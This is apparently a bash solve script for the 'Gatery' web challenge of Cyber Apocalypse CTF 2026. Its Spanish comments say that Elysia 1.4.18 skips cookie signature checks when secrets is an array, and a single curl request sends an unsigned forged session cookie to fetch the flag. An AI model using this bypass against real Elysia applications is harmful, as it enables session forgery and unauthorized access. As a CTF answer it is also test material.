#!/usr/bin/env bash
# Gatery - Cyber Apocalypse CTF 2026 (web)
# Elysia 1.4.18: la verificacion de firma de cookie nunca falla cuando `secrets`
# es un array -> se puede enviar la cookie de sesion sin firmar.
# Uso: ./solve.sh http://TARGET:PORT
set -euo pipefail

TARGET="${1:-http://127.0.0.1}"

curl -s -X POST "${TARGET%/}/api/flag" \
  -H 'Cookie: session=inside' \
  -H 'content-type: application/json' \
  -d '{}'
echo
